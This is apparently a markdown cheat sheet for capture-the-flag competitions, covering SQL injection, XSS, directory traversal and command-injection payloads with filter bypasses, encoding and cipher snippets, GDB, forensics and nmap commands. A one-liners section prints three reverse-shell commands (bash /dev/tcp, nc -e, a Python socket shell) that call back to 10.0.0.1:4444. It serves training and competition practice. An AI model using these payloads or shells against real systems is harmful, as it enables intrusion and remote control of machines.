---
title: "CTF Cheat Sheets Collection"
description: "Quick CTF reference: SQL injection, XSS, crypto ciphers, binary exploitation, forensics & network analysis. Copy-paste commands for CTF competitions."
---

# 🚀 CTF Cheat Sheets Collection

Quick reference guides for common CTF challenge types and techniques.

---

## 🌐 Web Exploitation

### SQL Injection
```sql
-- Basic authentication bypass
admin'--
admin' OR '1'='1'--
' OR 1=1--

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--

-- Boolean-based blind injection
' AND (SELECT SUBSTRING(@@version,1,1))='5'--
```

### XSS (Cross-Site Scripting)
```html
<!-- Basic payload -->
<script>alert('XSS')</script>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>

<!-- Bypass filters -->
<ScRiPt>alert('XSS')</ScRiPt>
javascript:alert('XSS')
<svg/onload=alert('XSS')>
```

### Directory Traversal
```bash
# Basic payloads
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

# Double encoding
%252e%252e%252f
```

### Command Injection
```bash
# Basic payloads
; ls -la
| whoami
&& cat /etc/passwd
`id`
$(whoami)

# Bypassing filters
ls${IFS}/
cat${IFS}/etc/passwd
{ls,-la}
```

---

## 🔐 Cryptography

### Common Encodings
```bash
# Base64
echo "text" | base64
echo "dGV4dA==" | base64 -d

# Hex
echo "text" | xxd -p
echo "74657874" | xxd -r -p

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote('text'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('text%20here'))"

# ASCII to decimal
python3 -c "print(' '.join(str(ord(c)) for c in 'text'))"
python3 -c "print(''.join(chr(int(x)) for x in '116 101 120 116'.split()))"
```

### Caesar Cipher
```python
def caesar_decrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            shifted = ord(char) - shift
            if char.isupper():
                if shifted < ord('A'):
                    shifted += 26
            else:
                if shifted < ord('a'):
                    shifted += 26
            result += chr(shifted)
        else:
            result += char
    return result

# Brute force all shifts
for i in range(26):
    print(f"Shift {i}: {caesar_decrypt('KHOOR ZRUOG', i)}")
```

### ROT13
```bash
echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
python3 -c "import codecs; print(codecs.encode('text', 'rot13'))"
```

### Hash Identification
```bash
# Common hash lengths
MD5: 32 characters
SHA1: 40 characters  
SHA256: 64 characters
SHA512: 128 characters

# Hashcat modes
MD5: -m 0
SHA1: -m 100
SHA256: -m 1400
NTLM: -m 1000
```

---

## 💾 Binary Exploitation & Reverse Engineering

### GDB Commands
```bash
# Basic debugging
gdb ./binary
(gdb) break main
(gdb) run
(gdb) step
(gdb) continue

# Examine memory
(gdb) x/20x $rsp        # Examine stack
(gdb) x/20i $rip        # Disassemble from current instruction
(gdb) info registers    # Show all registers

# Pwndbg enhancements
(gdb) checksec          # Security mitigations
(gdb) vmmap             # Memory mappings
(gdb) cyclic 200        # Create cyclic pattern
(gdb) cyclic -l aaab    # Find offset
```

### Binary Analysis
```bash
# File information
file binary
strings binary | grep flag
objdump -d binary
readelf -h binary

# Security mitigations
checksec --file=binary

# Running strings analysis
strings binary | grep -i password
strings binary | grep -i key
strings binary | grep -E "flag\{.*\}"
```

### Common Assembly Instructions
```assembly
; x86-64 calling convention
; Arguments: RDI, RSI, RDX, RCX, R8, R9
; Return value: RAX

; Stack frame setup
push rbp
mov rbp, rsp

; Function call
call function
; or
mov rax, function_address
call rax

; System call (x86-64)
mov rax, syscall_number
mov rdi, arg1
mov rsi, arg2
mov rdx, arg3
syscall
```

---

## 🕵️ Forensics

### File Analysis
```bash
# File type identification
file filename
xxd filename | head

# Metadata extraction
exiftool image.jpg
strings filename | grep -i flag

# Binwalk for embedded files
binwalk filename
binwalk -e filename     # Extract embedded files

# Foremost file carving
foremost -i image.dd
```

### Image Forensics
```bash
# Steganography
steghide extract -sf image.jpg
stegsolve image.jpg

# LSB analysis
python3 -c "
from PIL import Image
img = Image.open('image.png')
pixels = list(img.getdata())
lsb_bits = [str(p[0] & 1) for p in pixels]  # Red channel LSB
binary = ''.join(lsb_bits)
print([chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8)])
"
```

### Network Analysis (Wireshark)
```bash
# Common filters
http                    # HTTP traffic only
tcp.port == 80         # Traffic on port 80
ip.addr == 192.168.1.1 # Traffic to/from specific IP
dns                    # DNS queries only
ftp-data               # FTP data transfer

# Export objects
File -> Export Objects -> HTTP/FTP/SMB

# Follow streams
Right-click packet -> Follow -> TCP Stream
```

---

## 📡 Network & Protocols

### Port Scanning
```bash
# Nmap common scans
nmap -sS -O target.com              # SYN scan with OS detection
nmap -sV -A target.com              # Version detection and aggressive scan
nmap -p- target.com                 # Scan all ports
nmap -sU -p 53,67,68,123 target.com # UDP scan specific ports
```

### Protocol Analysis
```bash
# TCP connection
nc target.com 80
GET / HTTP/1.1
Host: target.com

# UDP communication
nc -u target.com 53

# Banner grabbing
telnet target.com 21
telnet target.com 22
telnet target.com 25
```

---

## 🐍 Python Quick Scripts

### Payload Generation
```python
#!/usr/bin/env python3
import sys
import subprocess

# Generate cyclic pattern
def cyclic(length):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    pattern = ""
    for i in range(length):
        pattern += alphabet[i % len(alphabet)]
    return pattern

# Find offset in cyclic pattern
def cyclic_find(substring):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for i in range(len(alphabet)):
        for j in range(len(alphabet)):
            for k in range(len(alphabet)):
                for l in range(len(alphabet)):
                    if alphabet[i] + alphabet[j] + alphabet[k] + alphabet[l] == substring:
                        return i * len(alphabet)**3 + j * len(alphabet)**2 + k * len(alphabet) + l
    return -1
```

### Common Conversions
```python
# Number base conversions
def convert_bases(num_str):
    try:
        # Try different bases
        decimal = int(num_str, 10)
        binary = int(num_str, 2)  
        octal = int(num_str, 8)
        hexadecimal = int(num_str, 16)
        
        print(f"As decimal: {decimal}")
        print(f"As binary: {binary}")
        print(f"As octal: {octal}")
        print(f"As hex: {hexadecimal}")
    except:
        print("Invalid number format")

# ASCII conversions
def ascii_convert(text):
    # String to ASCII values
    ascii_vals = [ord(c) for c in text]
    print(f"ASCII values: {ascii_vals}")
    
    # ASCII values to string
    if all(isinstance(x, int) and 0 <= x <= 127 for x in ascii_vals):
        original = ''.join(chr(x) for x in ascii_vals)
        print(f"As string: {original}")
```

---

## 🔧 One-Liners & Bash Scripts

### File Operations
```bash
# Find files by pattern
find / -name "*flag*" 2>/dev/null
find . -type f -exec grep -l "flag{" {} \; 2>/dev/null

# Extract strings with specific pattern
grep -r "flag{" /path/to/search/
grep -oE "flag\{[^}]+\}" file.txt

# Monitor file changes
inotifywait -m /path/to/watch -e modify,create,delete

# Create reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/bash 10.0.0.1 4444
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Data Extraction
```bash
# Extract data between markers
sed -n '/BEGIN/,/END/p' file.txt
awk '/BEGIN/,/END/' file.txt

# Base64 decode from file
cat file.txt | tr -d '\n' | base64 -d

# URL decode
python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.argv[1]))" "$url"

# Extract emails from text
grep -oE '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' file.txt
```

---

## 🎯 CTF-Specific Commands

### Flag Formats
```bash
# Common flag patterns
flag{.*}
FLAG{.*}
[A-Za-z0-9_]+{.*}
ctf{.*}
[event]{.*}

# Search for flag patterns
grep -rE "flag\{[^}]+\}" /path/
grep -rE "[A-Za-z0-9_]+\{[^}]+\}" /path/
```

### Quick Wins
```bash
# Check for hidden files
ls -la
find . -name ".*" -type f

# Environment variables
env | grep -i flag
printenv | grep -i flag

# Process information
ps aux | grep flag
ps -ef | grep flag

# Network connections
netstat -tulpn | grep flag
ss -tulpn | grep flag

# Check running services
systemctl list-units --type=service | grep flag
```

---

## 🔗 Useful Resources

### Online Tools
- **CyberChef**: https://gchq.github.io/CyberChef/
- **dcode.fr**: https://www.dcode.fr/en (cipher identification)
- **Hash Analyzer**: https://www.tunnelsup.com/hash-analyzer/
- **Regex101**: https://regex101.com/
- **ASCII Table**: https://www.asciitable.com/

### Payload Databases
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **SecLists**: https://github.com/danielmiessler/SecLists
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/

### Practice Platforms
- **PicoCTF**: https://picoctf.org/
- **OverTheWire**: https://overthewire.org/
- **TryHackMe**: https://tryhackme.com/
- **HackTheBox**: https://hackthebox.com/

---

## 📝 Quick Setup Commands

### CTF Environment
```bash
# Create CTF directory structure
mkdir -p ~/ctf/{tools,challenges,writeups,scripts}
cd ~/ctf

# Download common wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
unzip master.zip && rm master.zip

# Set up Python virtual environment
python3 -m venv ctf-env
source ctf-env/bin/activate
pip install pwntools requests pycryptodome z3-solver

# Quick web server
python3 -m http.server 8000
```

---

*Last updated: {{date}}*
*Keep this handy during CTF events!*

## Tags
#ctf #cheatsheet #reference #quickstart #commands